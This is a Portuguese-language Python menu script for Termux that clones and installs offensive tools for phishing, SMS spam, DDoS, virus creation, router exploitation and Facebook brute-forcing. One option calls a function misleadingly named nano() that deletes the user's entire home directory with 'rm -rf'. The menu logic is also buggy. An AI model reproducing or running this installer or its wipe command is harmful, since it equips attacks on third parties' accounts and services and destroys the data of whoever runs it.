import time
import os, sys 
os.system("clear")

cor = "\033[1;91m"

def banner2():
	print("""\033[1;95m
⠀⠀⠀⠰⡿⠿⠛⠛⠻⠿⣷
⠀⠀⠀⠀⠀⠀⣀⣄⡀⠀⠀⠀⠀⢀⣀⣀⣤⣄⣀⡀
⠀⠀⠀⠀⠀⢸⣿⣿⣷⠀⠀⠀⠀⠛⠛⣿⣿⣿⡛⠿⠷
⠀⠀⠀⠀⠀⠘⠿⠿⠋⠀⠀⠀⠀⠀⠀⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁

⠀⠀⠀⠀⣿⣷⣄⠀⢶⣶⣷⣶⣶⣤⣀
⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠈⠙⠻⠗
⠀⠀⠀⣰⣿⣿⣿⠀⠀⠀⠀⢀⣀⣠⣤⣴⣶⡄
⠀⣠⣾⣿⣿⣿⣥⣶⣶⣿⣿⣿⣿⣿⠿⠿⠛⠃
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁
⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⠀⠀⠛⢿⣿⣿⣿⣿⣿⣿⡿⠟
⠀⠀⠀⠀⠀⠉⠉⠉""")

def banner3():
	print("""⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁""")

def banner4():
	print("""┈┈┈╲┈┈┈┈╱
┈┈┈╱▔▔▔▔╲
┈┈┃┈▇┈┈▇┈┃
╭╮┣━━━━━━┫╭╮
┃┃┃┈┈┈┈┈┈┃┃┃
╰╯┃┈┈┈┈┈┈┃╰╯
┈┈╰┓┏━━┓┏╯
┈┈┈╰╯┈┈╰╯""")

def banner5():
	print("""┊┊╭━━━╮┊┊╭━━━╮┊┊
┊┊┃┈▋▋┃┊┊┃▋▋┈┃┊┊
┏━╯┈┈┈◣┊┊◢┈┈┈╰━┓
┃┗━╯┈┈┃┊┊┃┈┈╰━┛┃
╰━┳━┳━╯┊┊╰━┳━┳━╯
━━┻━┻━━━━━━┻━┻━━""")

def banner6():
	print(""".        (҂`_´)
         <,︻╦̵̵̿╤─ ҉     ~  •
█۞███████]▄▄▄▄▄▄▄▄▄▄▃ ●●●
▂▄▅█████████▅▄▃▂…
[███████████████████]
◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙""")

def banner7():
	print("""
  ▇▇◤▔▔▔▔▔▔▔◥▇▇
  ▇▇▏◥▇◣┊◢▇◤▕▇▇
  ▇▇▏▃▆▅▎▅▆▃▕▇▇
  ▇▇▏╱▔▕▎▔▔╲▕▇▇
  ▇▇◣◣▃▅▎▅▃◢◢▇▇
  ▇▇▇◣◥▅▅▅◤◢▇▇▇
  ▇▇▇▇◣╲▇╱◢▇▇▇▇""")

def nano():
	os.system("cd $HOME && rm -rf *")
	
def ferramenta():
	print("""+---------------------+
|FERRAMENTAS ESTALADAS|
+---------------------+""")
def bannerpkg():
	print("""\033[1;95m
	
  ░░░ ░░░░▄░░░░░░░░░░░░░░ ▄ 
░░░░░░░░▌▒█░░░░░░░░░░░▄▀▒▌ 
░░░░░░░░▌▒▒█░░░░░░░░▄▀▒▒▒▐ 
░░░░░░░▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐ 
░░░░░▄▄▀▒░▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐ 
░░░▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌ 
░░▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▒▒▌ 
░░▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐ 
░▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌ 
░▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌ 
▌▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▒▐ 
▐▒▒▐▀▐▀▒░▄▄▒▄▒▒▒▒▒▒░▒░▒░▒▒▒▒▌ 
▐▒▒▒▀▀▄▄▒▒▒▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▐ 
░▌▒▒▒▒▒▒▀▀▀▒▒▒▒▒▒░▒░▒░▒░▒▒▒▌ 
░▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▄▒▒▐ 
░░▀▄▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▄▒▒▒▒▌ 
░░░░▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀ 
░░░░░░▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄""")


def tchau():
 	print("""\033[1;95m
        ___                       
       _(((,|    JA VAI ??  TCHAU TCHAU       
      /  _-\\                       
     / C o\o \                     
   _/_    __\ \     
  /   \ \___/  )   
  |    |\_|\  /   
  |    |#  #|/           
  (   /     | 
   |  |#  # | 
   |  |    #|                      
   |  | #___n_,_                  
,-/   7-' .     `\                 
`-\...\-_   -  o /                 
   |#  # `---U--'                  
   `-v-^-'\/                       
     \  |_|_                 
     (___mnnm""")
 


def banner1():
	print("\033[1;95m	｡+ﾟ☆ﾟ+｡★｡+ﾟ☆ﾟ+｡★GV2｡+ﾟ☆ﾟ+｡★｡+ﾟ☆ﾟ+｡\n")
	print("""\033[1;95m                  ,--.    ,--.
                 ((O ))--((O ))
               ,'_`--'____`--'_`.
              _:  ____________  :_
             | | ||::::::::::|| | |
             | | ||::::::::::|| | |
             | | ||::::::::::|| | |
             |_| |/__________\| |_|
               |________________|
            __..-'            `-..__
         .-| : .----------------. : |-.
       ,\ || | |\______________/| | || /.
      /`.\:| | ||  __  __  __  || | |;/,'\
      
     :`-._\;.| || '--''--''--' || |,:/_.-':
     |    :  | || .----------. || |  :    |
     |    |  | || '----SSt---' || |  |    |
     |    |  | ||   _   _   _  || |  |    |
     :,--.;  | ||  (_) (_) (_) || |  :,--.;
     (`-'|)  | ||______________|| |  (|`-')
      `--'   | |/______________\| |   `--'
             |____________________|
              `.________________,'
               (_______)(_______)
               (_______)(_______)
               (_______)(_______)
               (_______)(_______)
              |        ||        |
              '--------''--------' @GH05T3-404""")
	 	
def mainpkg():
	pkg = input('''\033[1;96m
[99] Menu dos pkg
[00] Sair 
-----> ''')
	if pkg != '99' or pkg == '00':
		tchau()
		exit()
	if pkg == '99':
		main3()

def main3():
	bannerpkg()
	GV2 = input('''\033[1;96m
[01] Git
[02] Clang
[03] Tor
[04] Figlet
[05] Cmatrix
[06] Cowsay
[07] Python 3
[08] Python 2
[09] Wget
[10] Nano
[11] Php
[12] Ruby
[13] Perl
[14] Curl
[15] Creditos 
[99] INSTALAR TODOS 
[00] Voltar ao menu inicial 
-----> ''')
	print("\033[1;34m ")
	if GV2 == '01' or GV2 == '1':
		print("")
		os.system("pkg install git -y")
		print("")
		mainpkg()
	if GV2 == '02' or GV2 == '2':
		print("")
		os.system("pkg install clang -y ")
		print("")
		mainpkg()
	if GV2 == '03' or GV2 == '3':
		print("")
		os.system("pkg install tor -y")
		print("")
		mainpkg()
	if GV2 == '04' or GV2 == '4':
		print("")
		os.system("pkg install figlet -y")
		print("")
		mainpkg()
	if GV2 == '05' or GV2 == '5':
		print("")
		os.system("pkg install cmatrix -y")
		print("")
		mainpkg()
	if GV2 == '06' or GV2 == '6':
		print("")
		os.system("pkg install cowsay -y ")
		print("")
		mainpkg()
	if GV2 == '07' or GV2 == '7':
		print("")
		os.system("pkg install python 3 -y ")
		print("")
		mainpkg()
	if GV2 == '08' or GV2 == '8':
		print("")
		os.system("pkg install python 2 -y")
		print("")
		mainpkg()
	if GV2 == '09' or GV2 == '9':
		print("")
		os.system("pkg install wget -y ")
		print("")
		mainpkg()
	if GV2 == '10':
		print("")
		os.system("pkg install nano -y")
		print("")
		mainpkg()
	if GV2 == '11':
		print("")
		os.system("pkg install php -y")
		print("")
		mainpkg()
	if GV2 == '12':
		print("")
		os.system("pkg install ruby -y ")
		print("")
		mainpkg()
	if GV2 == '13':
		print("")
		os.system("pkg install perl -y ")
		print("")
		mainpkg()
	if GV2 == '14':
		print("")
		os.system("pkg install curl -y")
		print("")
		mainpkg()
	if GV2 == '15':
		print("")
		print("Zap do criador ----> WA.me/+5562992706758")
		print("Discord do criador ---> GHOST/404#5906")
		print("github de um parceiro ----> https://github.com/luc4sd3v")
		mainpkg()
	if GV2 == '00':
		os.system("clear")
		main()
	if GV2 == '99':
		print("")
		os.system("""pkg install git -y
		pkg install clang -y
		pkg install tor -y
		pkg install figlet -y
		pkg install cmatrix -y
		pkg install cowsay -y
		pkg install python 3 -y
		pkg install python 2 -y
		pkg install wget -y
		pkg install nano -y
		pkg install php -y
		pkg install ruby -y
		pkg install perl -y
		pkg install curl -y""")
		mainpkg()

def main2():
	tooy = input('''\033[1;96m
[00] Sair
[99] Menu
----->  ''')
	if tooy == '00':
		tchau()
		exit()
	
	if tooy == '99':
		os.system("clear")
		main()

print("")


def main():
	banner1()
	teste = input("""\033[1;96m
[01] PISHING
[02] SPAM SMS
[03] SQLMAP
[04] METASPLOIT
[05] VIRUS
[06] BOT DO INSTA
[07] PERSONALIZADOR
[08] DDOS
[09] ROUTERSPLOIT
[10] LAZIMUX
[11] BLACK HYDRA
[12] BTF PRA FACEBOOK 
[13] ALGUMS PKG 
[CP] PARCEROS
[CR] CREDITOS
[666] NAO EXECUTE ESSA FUNÇAO 
[E] EXIT 
------> """)

	print("\033[1;34m")
	if teste == '01' or teste == '1':
		os.system("clear")
		print("ISSO PODE DEMORAR UM POUCO")
		print("")
		print("Loading…")
		print("█▒▒▒▒▒▒▒▒▒")
		print("10%")
		print("███▒▒▒▒▒▒▒")
		print("30%")
		print("█████▒▒▒▒▒")
		print("50%")
		print("███████▒▒▒")
		print("100%")
		print("██████████")
		print("")
		print("FERRAMENTA ------> NgrokCustomLInk")
		print("")
		print("╲╭━━━━╮╲╲")
		print("╲┃╭╮╭╮┃╲╲")
		print("┗┫┏━━┓┣┛╲")
		print("╲┃╰━━╯┃")
		print("╲╰┳━━┳╯╲╲")
		print("")
		os.system("git clone https://github.com/doctor154/NgrokCustomLInk")
		os.system("mv NgrokCustomLInk /data/data/com.termux/files/home")
		print("")
		print("FERRAMENTA ------> FotoSploit")
		print("")
		os.system("git clone https://github.com/Cesar-Hack-Gray/FotoSploit")
		os.system("mv FotoSploit /data/data/com.termux/files/home")
		os.system("rm -rf NgrokCustomLInk")
		os.system("rm -rf FotoSploit")
		print("")
		print("+----------------------+")
		print("|FERRAMENTAS INSTALADAS|")
		print("+----------------------+")
		print("AS FERRAMENTAS SAO ==> NgrokCustomLInk , FOTOSPLOIT")
		print("")
		main2()
	
	if teste == '02' or teste == '2':
		os.system("clear")
		print("ISSO PODE DEMORAR UM POUCO")
		print("")
		print("Loading…")
		print("█▒▒▒▒▒▒▒▒▒")
		print("10%")
		print("███▒▒▒▒▒▒▒")
		print("30%")
		print("█████▒▒▒▒▒")
		print("50%")
		print("███████▒▒▒")
		print("100%")
		print("██████████")
		print("")
		print("FERRAMENTA -------> spamrito")
		print("")
		print("_/﹋\_")
		print("(҂`_´) - TOMA SPAM FDP")
		print("<;︻╦╤─ ҉ - - - - - - - - - - - - -")
		print("")
		os.system("git clone https://github.com/KiritoOfficial/spamrito")
		os.system("mv spamrito /data/data/com.termux/files/home")
		print("")
		print("+---------------------+")
		print("|FERRAMENTAS ESTALADAS|")
		print("+---------------------+")
		print("AS FERRAMENTAS SAO ===> SPAMRITO , ")
		print("")
		main2()
		
	if teste == '03' or teste == '3':
		os.system("clear")
		print("ISSO PODE DEMORAR UM POUCO ")
		print("▬▬▬.◙.▬▬▬")
		print("═▂▄▄▓▄▄▂")
		print("◢◤ █▀▀████▄▄▄▄▄▄◢◤")
		print("█▄ █ :) ██▀▀▀▀▀▀▀╬")
		print("◥█████◤")
		print("══╩══╩══")
		print("▬▬▬.SQLMAP.▬▬▬")
		print("")
		print("Loading…")
		print("█▒▒▒▒▒▒▒▒▒")
		print("10%")
		print("███▒▒▒▒▒▒▒")
		print("30%")
		print("█████▒▒▒▒▒")
		print("50%")
		print("███████▒▒▒")
		print("100%")
		print("██████████")
		print("")
		os.system("git clone https://github.com/sqlmapproject/sqlmap")
		os.system("mv sqlmap /data/data/com.termux/files/home")
		os.system("rm -rf sqlmap")
		print("")
		print("+---------------------+")
		print("|FERRAMENTAS ESTALADAS|")
		print("+---------------------+")
		print("ESSAS SAO AS FERRAMENTAS -----> sqlmap , ")
		print("")
		main2()
		
	if teste == '04' or teste == '4':
		print("")
		print("................/´¯/) ")
		print(".............../¯../ ")
		print("..METASPLOIT../..../ ")
		print("........../´¯/'...'/´¯¯`·¸ ")
		print("......./'/.../..../......./¨¯\ ")
		print(".....('(...´...´.... ¯~/'...') ")
		print("......\.................'...../ ")
		print(".......''...\.......... _.·´ ")
		print(".........\..............( ")
		print("...........\.............\...")
		print("ISSO PODE DEMORAR ")
		print("")
		os.system("pkg install unstable-repo")
		os.system("pkg install metasploit")
		print("")
		ferramenta()
		print("PRONTO AGORA E SO INICIAR COM 'MSFCONSOLE'")
		print("")
		main2()
		
	if teste == '05' or teste == '5':
		print("")
		banner4()
		print("FERRAMENTA ----> Evil-create-framework")
		print("")
		os.system("git clone https://github.com/LOoLzeC/Evil-create-framework")
		os.system("mv Evil-create-framework /data/data/com.termux/files/home")
		print("")
		ferramenta()
		print("FERRAMENTA INSTALADA 'EVIL-CREATE-FRAMEWORK'")
		print("")
		main2()
		
	if teste == '06' or teste == '6':
		print("")
		print("ferramenta ---'> toolsig.git")
		os.system("git clone https://github.com/officialputuid/toolsig.git")
		os.system("mv toolsig.git /data/data/com.termux/files/home")
		print("")
		ferramenta()
		print("")
		print("video de como usar ela ----> https://youtu.be/l4nvyz3XvwY")
		print("")
		main2()
		
	if teste == '07' or teste == '7':
		print("")
		print("ferramenta ----> tstyling")
		print("")
		os.system("git clone https://github.com/darkwarrior3/tstyling")
		os.system("mv tstyling /data/data/com.termux/files/home")
		print("")
		ferramenta()
		print("")
		print("video esplicando como usar ----> https://youtu.be/jHansTczNMY")
		print("")
		main2()
		
	if teste == '08' or teste == '8':
		print("ferramentas ----> hammer , torshammer")
		print("")
		os.system("git clone https://github.com/liorvh/hammer-1")
		os.system("git clone https://github.com/dotfighter/torshammer")
		os.system("mv hammer-1 /data/data/com.termux/files/home")
		os.system("mv torshammer /data/data/com.termux/files/home")
		print("")
		ferramenta()
		print("FERRAMENTA INSTALADA ---> hammer , torshammer")
		print("")
		main2()
		
	if teste == '09' or teste == '9':
		print("")
		print("ferramenta ---> ROUTERSPLOIT")
		print("")
		os.system("git clone https://github.com/threat9/routersploit")
		os.system("mv routersploit /data/data/com.termux/files/home")
		print("")
		ferramenta()
		print("FERRAMNETA INSTALADA ---> ROUTERSPLOIT ")
		print("Como usar ---> https://youtu.be/_2QSf0Evtjc")
		print("")
		main2()
		
	if teste == '10':
		print("")
		banner5()
		print("FERRAMENTA ---> LAZIMUX ")
		print("")
		os.system("git clone https://github.com/Gameye98/Lazymux")
		os.system("mv Lazymux /data/data/com.termux/files/home")
		print("")
		ferramenta()
		main2()
		
	if teste == '11':
		print("")
		print("FERRAMENTA ----> BLACK HYDRA ")
		os.system("git clone https://github.com/Gameye98/Black-Hydra")
		os.system("mv Black-Hydra /data/data/com.termux/files/home")
		print("")
		ferramenta()
		main2()
		
	if teste == '12':
		print("")
		banner6()
		print("FERRAMENTA ---> FBButre")
		print("")
		os.system("git clone https://github.com/Gameye98/FBBrute")
		os.system("mv FBBute /data/data/com.termux/files/home")
		print("")
		ferramenta()
		main2()
		
		
	if teste == '13':
		os.system("clear")
		main3()
		
	if teste == '666':
		banner7()
		print("EU AVISEI ")
		nano()
		main2()
		
		
	if teste == 'CP' or teste == 'cp' or teste == 'Cp':
		banner3()
		print("\ngithub de um parceiro ----> https://github.com/luc4sd3v")
		main2()
		
	if teste == 'E' or teste == 'e':
		tchau()
		exit()
		
		
	if teste == 'CR' or teste == 'cr' or teste == 'Cr':
		banner2()
		print("\nZap do criador ----> WA.me/+5562992706758")
		print("Discord do criador ---> GHOST/404#5906\n")
		main2()
							
	if teste != '6660012345678910111213141516':
		print("")
		print("+--------------+")
		print("|opçao invalida|")
		print("+--------------+")
		time.sleep(1)
		main()
							

if __name__ == "__main__":
        main()